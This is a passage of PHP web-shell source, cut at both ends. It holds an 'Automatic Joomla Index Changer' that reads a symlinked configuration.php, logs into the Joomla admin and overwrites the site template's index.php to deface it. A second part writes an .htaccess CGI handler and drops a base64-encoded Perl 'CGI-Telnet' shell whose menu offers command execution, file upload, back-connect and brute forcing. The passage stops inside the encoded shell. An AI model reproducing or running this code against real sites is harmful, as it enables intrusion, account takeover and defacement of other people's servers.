    $buffer = curl_exec($ch);
    
    $hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',2);
    if($hidden2) {
    echo("<br>[+] index.php file founded in Theme Editor");
    }
    else {
    echo("<br>[-] index.php Not found in Theme Editor");
    exit;
    }
    echo("<br>[*] Updating Index.php .....");
    $url2=$site_url."/index.php?option=com_templates&layout=edit";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"jform[source]=".$h."&jform[filename]=index.php&jform[extension_id]=".$template_id."&".$hidden2."=1&task=source.save");
    
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $pos = strpos($buffer,'<dd class="message message">');
    if($pos === false) {
    echo("<br>[-] Updating Index.php Error");
    exit;
    }
    else {
    echo("<br>[~] index.php successfully saved");
    }
    #################################################################
    ######################      V1.6  END      ######################
    #################################################################
    
    
    }
    else
    {
    
    #################################################################
    ######################      V1.5           ######################
    #################################################################
                    
    $req =mysql_query("SELECT * from  `".$dbprefix."templates_menu` WHERE client_id='0'");
             $data = mysql_fetch_array($req);
    $template_name=$data["template"];
    
    $url2=$site_url."/index.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $hidden=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',3);
    
    $url2=$site_url."/index.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456789&option=com_login&task=login&".$hidden."=1");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $pos = strpos($buffer,"com_config");
    
    if($pos === false) {
    echo("<br>[-] Login Error");
    exit;
    }
    else {
    echo("<br>[+] Login Successful");
    }
    ///////////////////////////
    $url2=$site_url."/index.php?option=com_templates&task=edit_source&client=0&id=".$template_name;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',6);
    
    if($hidden2) {
    echo("<br>[~] index.php file founded in Theme Editor");
    }
    else {
    echo("<br>[-] index.php Not found in Theme Editor");
    }
    
    echo("<br>[*] Updating Index.php .....");
    $url2=$site_url."/index.php?option=com_templates&layout=edit";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"filecontent=".$h."&id=".$template_name."&cid[]=".$template_name."&".$hidden2."=1&task=save_source&client=0");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $pos = strpos($buffer,'<dd class="message message fade">');
    if($pos === false) {
    echo("<br>[-] Updating Index.php Error");
    exit;
    }
    else {
    echo("<br>[~] index.php successfully saved");
    }
    #################################################################
    ######################      V1.5  END      ######################
    #################################################################
    
    }
    
    }
    
    
    function randomt() {
    
        $chars = "abcdefghijkmnopqrstuvwxyz023456789";
        srand((double)microtime()*1000000);
        $i = 0;
        $pass = '' ;
    
        while ($i <= 7) {
            $num = rand() % 33;
            $tmp = substr($chars, $num, 1);
            $pass = $pass . $tmp;
            $i++;
        }
    
        return $pass;
    
    }
    
    function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1)
    
    {
    
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    $ar=trim($ar1[0]);
    return $ar;
    }
    
    }?>
    <center><br><br>
    <font color="#00ff00" size='+3'><b>+--=[ Automatic Joomla Index Changer ]=--+</b></font><br><br>
    </center>
    <center><b>
    Link of symlink configuration.php of Joomla<br></b>
    <FORM action=""  method="post">
    <input type="hidden" name="form_action" value="1">
     <input type="text" class="inputz" size="60" name="file" value="http://site.com/sym/home/user/public_html/configuration.php">
    <br>
    <br><b>
    Admin Control panel url</b><br>
    <input type="text" class="inputz" size="40" name="site_url" value="http://site/administrator"><br>
    <br><b>
    Your Index Code</b>
    <br>
    <TEXTAREA rows="20" align="center" style="background:black" cols="120" name="code"> your index code
            </TEXTAREA>
            <br>
    <INPUT  class="inputzbut" type="submit" value="Lets Go Deface !!!" name="Submit">
    </FORM>
     </center>
    <script language=JavaScript>m='%09%09%09%09%09%09%09%3C/td%3E%0A%09%09%09%09%09%09%3C/tr%3E%0A%09%09%09%09%09%3C/table%3E%0A%09%09%09%09%3C/td%3E%0A%3C/html%3E';d=unescape(m);document.write(d);</script>
	<?php
}
 ///////////////////////////////////////////////////////////////////////////
 
 elseif(isset($_GET['x']) && ($_GET['x'] == 'cgi2012')) { 
 echo "<center/><br/><b>
 +--==[ CGI-Telnet Version 1.3 ]==--+ 
 </b><br><br>";
 
 
    mkdir('cgi2012', 0755);
    chdir('cgi2012');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
        $metin = "AddHandler cgi-script .izo";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$cgi2012 = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluCnVzZSBNSU1FOjpCYXNlNjQ7CiRWZXJzaW9uPSAiQ0dJLVRlbG5ldCBWZXJzaW9uIDEuMyI7CiRFZGl0UGVyc2lvbj0iPGZvbnQgc3R5bGU9J3RleHQtc2hhZG93OiAwcHggMHB4IDZweCByZ2IoMjU1LCAwLCAwKSwgMHB4IDBweCA1cHggcmdiKDMwMCwgMCwgMCksIDBweCAwcHggNXB4IHJnYigzMDAsIDAsIDApOyBjb2xvcjojZmZmZmZmOyBmb250LXdlaWdodDpib2xkOyc+YjM3NGsgLSBDR0ktVGVsbmV0PC9mb250PiI7CgokUGFzc3dvcmQgPSAiYmFuZHVuZ2tvdGFzYW1wYWgiOwkJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcwoJCQkJIyB0byBsb2dpbi4Kc3ViIElzX1dpbigpewoJJG9zID0gJnRyaW0oJEVOVnsiU0VSVkVSX1NPRlRXQVJFIn0pOwoJaWYoJG9zID1+IG0vd2luL2kpewoJCXJldHVybiAxOwoJfQoJZWxzZXsKCQlyZXR1cm4gMDsKCX0KfQokV2luTlQgPSAmSXNfV2luKCk7CQkJCSMgWW91IG5lZWQgdG8gY2hhbmdlIHRoZSB2YWx1ZSBvZiB0aGlzIHRvIDEgaWYKCQkJCQkJCQkjIHlvdSdyZSBydW5uaW5nIHRoaXMgc2NyaXB0IG9uIGEgV2luZG93cyBOVAoJCQkJCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91CgkJCQkJCQkJIyBjYW4gbGVhdmUgdGhlIHZhbHVlIGFzIGl0IGlzLgoKJE5UQ21kU2VwID0gIiYiOwkJCQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJCQkJCSMgaW4gYSBjb21tYW5kIGxpbmUgb24gV2luZG93cyBOVC4KCiRVbml4Q21kU2VwID0gIjsiOwkJCQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJCQkJCSMgaW4gYSBjb21tYW5kIGxpbmUgb24gVW5peC4KCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMTAwMDA7CSMgVGltZSBpbiBzZWNvbmRzIGFmdGVyIGNvbW1hbmRzIHdpbGwgYmUga2lsbGVkCgkJCQkJCQkJIyBEb24ndCBzZXQgdGhpcyB0byBhIHZlcnkgbGFyZ2UgdmFsdWUuIFRoaXMgaXMKCQkJCQkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0CgkJCQkJCQkJIyB0YWtlIHZlcnkgbG9uZyB0byBleGVjdXRlLCBsaWtlICJmaW5kIC8iLgoJCQkJCQkJCSMgVGhpcyBpcyB2YWxpZCBvbmx5IG9uIFVuaXggc2VydmVycy4gSXQgaXMKCQkJCQkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4KCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkJIyBJZiB0aGlzIGlzIDEsIHRoZW4gZGF0YSBpcyBzZW50IHRvIHRoZQoJCQkJCQkJCSMgYnJvd3NlciBhcyBzb29uIGFzIGl0IGlzIG91dHB1dCwgb3RoZXJ3aXNlCgkJCQkJCQkJIyBpdCBpcyBidWZmZXJlZCBhbmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kCgkJCQkJCQkJIyBjb21wbGV0ZXMuIFRoaXMgaXMgdXNlZnVsIGZvciBjb21tYW5kcyBsaWtlCgkJCQkJCQkJIyBwaW5nLCBzbyB0aGF0IHlvdSBjYW4gc2VlIHRoZSBvdXRwdXQgYXMgaXQKCQkJCQkJCQkjIGlzIGJlaW5nIGdlbmVyYXRlZC4KCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISEKCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOwokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7CiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOwokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOwokY29scz0gMTUwOwokcm93cz0gMjY7CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBSZWFkcyB0aGUgaW5wdXQgc2VudCBieSB0aGUgYnJvd3NlciBhbmQgcGFyc2VzIHRoZSBpbnB1dCB2YXJpYWJsZXMuIEl0CiMgcGFyc2VzIEdFVCwgUE9TVCBhbmQgbXVsdGlwYXJ0L2Zvcm0tZGF0YSB0aGF0IGlzIHVzZWQgZm9yIHVwbG9hZGluZyBmaWxlcy4KIyBUaGUgZmlsZW5hbWUgaXMgc3RvcmVkIGluICRpbnsnZid9IGFuZCB0aGUgZGF0YSBpcyBzdG9yZWQgaW4gJGlueydmaWxlZGF0YSd9LgojIE90aGVyIHZhcmlhYmxlcyBjYW4gYmUgYWNjZXNzZWQgdXNpbmcgJGlueyd2YXInfSwgd2hlcmUgdmFyIGlzIHRoZSBuYW1lIG9mCiMgdGhlIHZhcmlhYmxlLiBOb3RlOiBNb3N0IG9mIHRoZSBjb2RlIGluIHRoaXMgZnVuY3Rpb24gaXMgdGFrZW4gZnJvbSBvdGhlciBDR0kKIyBzY3JpcHRzLgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBSZWFkUGFyc2UgCnsKCWxvY2FsICgqaW4pID0gQF8gaWYgQF87Cglsb2NhbCAoJGksICRsb2MsICRrZXksICR2YWwpOwoJCgkkTXVsdGlwYXJ0Rm9ybURhdGEgPSAkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLzsKCglpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJHRVQiKQoJewoJCSRpbiA9ICRFTlZ7J1FVRVJZX1NUUklORyd9OwoJfQoJZWxzaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiUE9TVCIpCgl7CgkJYmlubW9kZShTVERJTikgaWYgJE11bHRpcGFydEZvcm1EYXRhICYgJFdpbk5UOwoJCXJlYWQoU1RESU4sICRpbiwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7Cgl9CgoJIyBoYW5kbGUgZmlsZSB1cGxvYWQgZGF0YQoJaWYoJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC8pCgl7CgkJJEJvdW5kYXJ5ID0gJy0tJy4kMTsgIyBwbGVhc2UgcmVmZXIgdG8gUkZDMTg2NyAKCQlAbGlzdCA9IHNwbGl0KC8kQm91bmRhcnkvLCAkaW4pOyAKCQkkSGVhZGVyQm9keSA9ICRsaXN0WzFdOwoJCSRIZWFkZXJCb2R5ID1+IC9cclxuXHJcbnxcblxuLzsKCQkkSGVhZGVyID0gJGA7CgkJJEJvZHkgPSAkJzsKIAkJJEJvZHkgPX4gcy9cclxuJC8vOyAjIHRoZSBsYXN0IFxyXG4gd2FzIHB1dCBpbiBieSBOZXRzY2FwZQoJCSRpbnsnZmlsZWRhdGEnfSA9ICRCb2R5OwoJCSRIZWFkZXIgPX4gL2ZpbGVuYW1lPVwiKC4rKVwiLzsgCgkJJGlueydmJ30gPSAkMTsgCgkJJGlueydmJ30gPX4gcy9cIi8vZzsKCQkkaW57J2YnfSA9fiBzL1xzLy9nOwoKCQkjIHBhcnNlIHRyYWlsZXIKCQlmb3IoJGk9MjsgJGxpc3RbJGldOyAkaSsrKQoJCXsgCgkJCSRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOwoJCQkkbGlzdFskaV0gPX4gL1wiKFx3KylcIi87CgkJCSRrZXkgPSAkMTsKCQkJJHZhbCA9ICQnOwoJCQkkdmFsID1+IHMvKF4oXHJcblxyXG58XG5cbikpfChcclxuJHxcbiQpLy9nOwoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkaW57JGtleX0gPSAkdmFsOyAKCQl9Cgl9CgllbHNlICMgc3RhbmRhcmQgcG9zdCBkYXRhICh1cmwgZW5jb2RlZCwgbm90IG11bHRpcGFydCkKCXsKCQlAaW4gPSBzcGxpdCgvJi8sICRpbik7CgkJZm9yZWFjaCAkaSAoMCAuLiAkI2luKQoJCXsKCQkJJGluWyRpXSA9fiBzL1wrLyAvZzsKCQkJKCRrZXksICR2YWwpID0gc3BsaXQoLz0vLCAkaW5bJGldLCAyKTsKCQkJJGtleSA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsKCQkJJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsKCQkJJGlueyRrZXl9IC49ICJcMCIgaWYgKGRlZmluZWQoJGlueyRrZXl9KSk7CgkJCSRpbnska2V5fSAuPSAkdmFsOwoJCX0KCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBQYWdlIEhlYWRlcgojIEFyZ3VtZW50IDE6IEZvcm0gaXRlbSBuYW1lIHRvIHdoaWNoIGZvY3VzIHNob3VsZCBiZSBzZXQKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRQYWdlSGVhZGVyCnsKCSRFbmNvZGVkQ3VycmVudERpciA9ICRDdXJyZW50RGlyOwoJJEVuY29kZWRDdXJyZW50RGlyID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsKCW15ICRkaXIgPSRDdXJyZW50RGlyOwoJJGRpcj1+IHMvXFwvXFxcXC9nOwoJcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7CglwcmludCA8PEVORDsKPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+Cjx0aXRsZT5IYWNzdWdpYTwvdGl0bGU+CgokSHRtbE1ldGFIZWFkZXIKCjwvaGVhZD4KPHN0eWxlPgpib2R5ewpmb250OiAxMHB0IFZlcmRhbmE7Cn0KdHIgewpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsKY29sb3I6ICNmZjk5MDA7Cn0KdGQgewpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsKY29sb3I6ICMyQkE4RUM7CmZvbnQ6IDEwcHQgVmVyZGFuYTsKfQoKdGFibGUgewpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsKQkFDS0dST1VORC1DT0xPUjogIzExMTsKfQoKCmlucHV0IHsKQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7CkJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOwpmb250OiAxMHB0IFZlcmRhbmE7CmNvbG9yOiAjZmY5OTAwOwp9CgppbnB1dC5zdWJtaXQgewp0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47CmNvbG9yOiAjRkZGRkZGOwpib3JkZXItY29sb3I6ICMwMDk5MDA7Cn0KCmNvZGUgewpib3JkZXIJCQk6IGRhc2hlZCAwcHggIzMzMzsKQkFDS0dST1VORC1DT0xPUjogQmxhY2s7CmZvbnQ6IDEwcHQgVmVyZGFuYSBib2xkOwpjb2xvcjogd2hpbGU7Cn0KCnJ1biB7CmJvcmRlcgkJCTogZGFzaGVkIDBweCAjMzMzOwpmb250OiAxMHB0IFZlcmRhbmEgYm9sZDsKY29sb3I6ICNGRjAwQUE7Cn0KCnRleHRhcmVhIHsKQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7CkJBQ0tHUk9VTkQtQ09MT1I6ICMxYjFiMWI7CmZvbnQ6IEZpeGVkc3lzIGJvbGQ7CmNvbG9yOiAjYWFhOwp9CkE6bGluayB7CglDT0xPUjogIzJCQThFQzsgVEVYVC1ERUNPUkFUSU9OOiBub25lCn0KQTp2aXNpdGVkIHsKCUNPTE9SOiAjMkJBOEVDOyBURVhULURFQ09SQVRJT046IG5vbmUKfQpBOmhvdmVyIHsKCXRleHQtc2hhZG93OiAwcHQgMHB0IDAuM2VtIGN5YW4sIDBwdCAwcHQgMC4zZW0gY3lhbjsKCWNvbG9yOiAjZmY5OTAwOyBURVhULURFQ09SQVRJT046IG5vbmUKfQpBOmFjdGl2ZSB7Cgljb2xvcjogUmVkOyBURVhULURFQ09SQVRJT046IG5vbmUKfQoKLmxpc3RkaXIgdHI6aG92ZXJ7CgliYWNrZ3JvdW5kOiAjNDQ0Owp9Ci5saXN0ZGlyIHRyOmhvdmVyIHRkewoJYmFja2dyb3VuZDogIzQ0NDsKCXRleHQtc2hhZG93OiAwcHQgMHB0IDAuM2VtIGN5YW4sIDBwdCAwcHQgMC4zZW0gY3lhbjsKCWNvbG9yOiAjRkZGRkZGOyBURVhULURFQ09SQVRJT046IG5vbmU7Cn0KLm5vdGxpbmV7CgliYWNrZ3JvdW5kOiAjMTExOwp9Ci5saW5lewoJYmFja2dyb3VuZDogIzIyMjsKfQo8L3N0eWxlPgo8c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0Ij4KZnVuY3Rpb24gY2htb2RfZm9ybShpLGZpbGUpCnsKCS8qdmFyIGFqYXg9J2FqYXhfUG9zdERhdGEoIkZvcm1QZXJtc18nK2krJyIsIiRTY3JpcHRMb2NhdGlvbiIsIlJlc3BvbnNlRGF0YSIpOyByZXR1cm4gZmFsc2U7JzsqLwoJdmFyIGFqYXg9IiI7Cglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZVBlcm1zXyIraSkuaW5uZXJIVE1MPSI8Zm9ybSBuYW1lPUZvcm1QZXJtc18iICsgaSsgIiBhY3Rpb249JycgbWV0aG9kPSdQT1NUJz48aW5wdXQgaWQ9dGV4dF8iICsgaSArICIgIG5hbWU9Y2htb2QgdHlwZT10ZXh0IHNpemU9NSAvPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz0nc3VibWl0JyBvbmNsaWNrPSciICsgYWpheCArICInIHZhbHVlPU9LPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9J2d1aSc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT0nJGRpcic+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZiB2YWx1ZT0nIitmaWxlKyInPjwvZm9ybT4iOwoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRleHRfIiArIGkpLmZvY3VzKCk7Cn0KZnVuY3Rpb24gcm1fY2htb2RfZm9ybShyZXNwb25zZSxpLHBlcm1zLGZpbGUpCnsKCXJlc3BvbnNlLmlubmVySFRNTCA9ICI8c3BhbiBvbmNsaWNrPVxcXCJjaG1vZF9mb3JtKCIgKyBpICsgIiwnIisgZmlsZSsgIicpXFxcIiA+IisgcGVybXMgKyI8L3NwYW4+PC90ZD4iOwp9CmZ1bmN0aW9uIHJlbmFtZV9mb3JtKGksZmlsZSxmKQp7Cgl2YXIgYWpheD0iIjsKCWYucmVwbGFjZSgvXFxcXC9nLCJcXFxcXFxcXCIpOwoJdmFyIGJhY2s9InJtX3JlbmFtZV9mb3JtKCIraSsiLFxcXCIiK2ZpbGUrIlxcXCIsXFxcIiIrZisiXFxcIik7IHJldHVybiBmYWxzZTsiOwoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9Ijxmb3JtIG5hbWU9Rm9ybVBlcm1zXyIgKyBpKyAiIGFjdGlvbj0nJyBtZXRob2Q9J1BPU1QnPjxpbnB1dCBpZD10ZXh0XyIgKyBpICsgIiAgbmFtZT1yZW5hbWUgdHlwZT10ZXh0IHZhbHVlPSAnIitmaWxlKyInIC8+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIG9uY2xpY2s9JyIgKyBhamF4ICsgIicgdmFsdWU9T0s+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIG9uY2xpY2s9JyIgKyBiYWNrICsgIicgdmFsdWU9Q2FuY2VsPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9J2d1aSc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT0nJGRpcic+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZiB2YWx1ZT0nIitmaWxlKyInPjwvZm9ybT4iOwoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRleHRfIiArIGkpLmZvY3VzKCk7Cn0KZnVuY3Rpb24gcm1fcmVuYW1lX2Zvcm0oaSxmaWxlLGYpCnsKCWlmKGY9PSdmJykKCXsKCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZV8iK2kpLmlubmVySFRNTD0iPGEgaHJlZj0nP2E9Y29tbWFuZCZkPSRkaXImYz1lZGl0JTIwIitmaWxlKyIlMjAnPiIgK2ZpbGUrICI8L2E+IjsKCX1lbHNlCgl7CgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9IjxhIGhyZWY9Jz9hPWd1aSZkPSIrZisiJz5bICIgK2ZpbGUrICIgXTwvYT4iOwoJfQp9Cjwvc2NyaXB0Pgo8Ym9keSBvbkxvYWQ9ImRvY3VtZW50LmYuQF8uZm9jdXMoKSIgYmdjb2xvcj0iIzBjMGMwYyIgdG9wbWFyZ2luPSIwIiBsZWZ0bWFyZ2luPSIwIiBtYXJnaW53aWR0aD0iMCIgbWFyZ2luaGVpZ2h0PSIwIj4KPGNlbnRlcj48Y29kZT4KPHRhYmxlIGJvcmRlcj0iMSIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+Cjx0cj4KCTx0ZCBhbGlnbj0iY2VudGVyIiByb3dzcGFuPTI+CgkJPGI+PGZvbnQgc2l6ZT0iNSI+JEVkaXRQZXJzaW9uPC9mb250PjwvYj4KCTwvdGQ+CgoJPHRkPgoKCQk8Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4kRU5WeyJTRVJWRVJfU09GVFdBUkUifTwvZm9udD4KCTwvdGQ+Cgk8dGQ+U2VydmVyIElQOjxmb250IGNvbG9yPSIjY2MwMDAwIj4gJEVOVnsnU0VSVkVSX0FERFInfTwvZm9udD4gfCBZb3VyIElQOiA8Zm9udCBjb2xvcj0iIzAwMDAwMCI+JEVOVnsnUkVNT1RFX0FERFInfTwvZm9udD4KCTwvdGQ+Cgo8L3RyPgoKPHRyPgo8dGQgY29sc3Bhbj0iMyI+PGZvbnQgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+CjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbiI+SG9tZTwvYT4gfCAKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Y29tbWFuZCZkPSRFbmNvZGVkQ3VycmVudERpciI+Q29tbWFuZDwvYT4gfAo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1ndWkmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkdVSTwvYT4gfCAKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5VcGxvYWQgRmlsZTwvYT4gfCAKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkRvd25sb2FkIEZpbGU8L2E+IHwKCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWJhY2tiaW5kIj5CYWNrICYgQmluZDwvYT4gfAo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1icnV0ZWZvcmNlciI+QnJ1dGUgRm9yY2VyPC9hPiB8CjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWNoZWNrbG9nIj5DaGVjayBMb2c8L2E+IHwKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG9tYWluc3Vz